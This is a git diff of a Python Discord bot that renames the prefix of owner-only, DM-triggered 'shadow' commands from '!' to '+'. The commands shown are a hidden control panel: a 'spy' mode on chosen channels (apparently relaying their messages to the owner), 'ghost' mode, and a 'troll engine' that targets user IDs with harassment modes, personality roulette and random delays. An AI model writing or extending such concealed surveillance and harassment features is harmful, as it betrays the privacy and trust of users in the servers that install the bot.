@@ -61,11 +61,11 @@ class MirraBot(commands.Bot):
         # Legacy Shadow Commands for Owner in DMs (Preserved as requested, but cleaned up)
         msg = message.content.strip().lower()
         if isinstance(message.channel, discord.DMChannel) and message.author.id == OWNER_ID:
-            if msg == "!админ":
+            if msg in ["+админ", "+админ-панель"]:
                 view = ShadowAdminPanel(self)
                 await message.channel.send(embed=create_premium_embed("🕹️ Shadow Panel", "Интерактивное управление теневыми операциями."), view=view)
                 return
-            elif msg.startswith("!say "):
+            elif msg.startswith("+say "):
                 text = message.content[5:].strip()
                 count = 0
                 for ch_id, ch_set in db.channel_settings.items():
@@ -76,7 +76,7 @@ class MirraBot(commands.Bot):
                         except: pass
                 await message.channel.send(embed=create_success_embed("Broadcast", f"Отправлено в {count} каналов."))
                 return
-            elif msg.startswith("!тролль "):
+            elif msg.startswith("+тролль "):
                 try:
                     parts = message.content.split()
                     uid = int(parts[1])
@@ -85,9 +85,9 @@ class MirraBot(commands.Bot):
                     troll_engine.add_target(uid, mode, mins)
                     await message.channel.send(embed=create_success_embed("Troll Engine", f"Цель `{uid}` в режиме `{mode}` на `{mins}` минут."))
                 except Exception:
-                    await message.channel.send(embed=create_error_embed("Ошибка синтаксиса", "!тролль <ID> <режим> <минуты>"))
+                    await message.channel.send(embed=create_error_embed("Ошибка синтаксиса", "+тролль <ID> <режим> <минуты>"))
                 return
-            elif msg.startswith("!снять "):
+            elif msg.startswith("+снять "):
                 try:
                     uid = int(message.content.split()[1])
                     troll_engine.remove_target(uid)
@@ -96,47 +96,47 @@ class MirraBot(commands.Bot):
                 return
             
             # Additional Operations mapped via the UI panel instructions
-            elif msg.startswith("!spy "):
+            elif msg.startswith("+spy "):
                 cid_to_spy = int(message.content.split()[1])
                 spy_channels[cid_to_spy] = OWNER_ID
                 await message.channel.send(embed=create_success_embed("Shadow Engine", f"Режим SPY активирован для канала `{cid_to_spy}`."))
                 return
-            elif msg.startswith("!unspy "):
+            elif msg.startswith("+unspy "):
                 cid_to_spy = int(message.content.split()[1])
                 spy_channels.pop(cid_to_spy, None)
                 await message.channel.send(embed=create_success_embed("Shadow Engine", f"Режим SPY деактивирован для `{cid_to_spy}`."))
                 return
-            elif msg.startswith("!ghost "):
+            elif msg.startswith("+ghost "):
                 cid_to_ghost = int(message.content.split()[1])
                 ghost_channels.add(cid_to_ghost)
                 await message.channel.send(embed=create_success_embed("Shadow Engine", f"Режим GHOST активирован для `{cid_to_ghost}`."))
                 return
-            elif msg.startswith("!unghost "):
+            elif msg.startswith("+unghost "):
                 cid_to_ghost = int(message.content.split()[1])
                 ghost_channels.discard(cid_to_ghost)
                 await message.channel.send(embed=create_success_embed("Shadow Engine", f"Режим GHOST деактивирован для `{cid_to_ghost}`."))
                 return
-            elif msg.startswith("!roulette "):
+            elif msg.startswith("+roulette "):
                 tgt_cid = int(message.content.split()[1])
                 troll_engine.roulette_channels.add(tgt_cid)
                 await message.channel.send(embed=create_success_embed("Troll Engine", f"Рулетка личностей запущена в `{tgt_cid}`."))
                 return
-            elif msg.startswith("!unroulette "):
+            elif msg.startswith("+unroulette "):
                 tgt_cid = int(message.content.split()[1])
                 troll_engine.roulette_channels.discard(tgt_cid)
                 await message.channel.send(embed=create_success_embed("Troll Engine", f"Рулетка остановлена в `{tgt_cid}`."))
                 return
-            elif msg.startswith("!delay "):
+            elif msg.startswith("+delay "):
                 tgt_cid = int(message.content.split()[1])
                 troll_engine.delay_channels.add(tgt_cid)
                 await message.channel.send(embed=create_success_embed("Troll Engine", f"Режим случайных задержек активирован в `{tgt_cid}`."))
                 return
-            elif msg.startswith("!undelay "):
+            elif msg.startswith("+undelay "):
                 tgt_cid = int(message.content.split()[1])
                 troll_engine.delay_channels.discard(tgt_cid)
                 await message.channel.send(embed=create_success_embed("Troll Engine", f"Режим задержек отключен в `{tgt_cid}`."))
                 return
-            elif msg.startswith("!reverse "):
+            elif msg.startswith("+reverse "):
                 parts = message.content.split()
                 tgt_cid = int(parts[1])
                 mins = int(parts[2])
@@ -148,4 +148,4 @@ class MirraBot(commands.Bot):
 intents = discord.Intents.default()
 intents.message_content = True
 intents.members = True
-client = MirraBot(command_prefix="!", intents=intents)
+client = MirraBot(command_prefix="+", intents=intents)
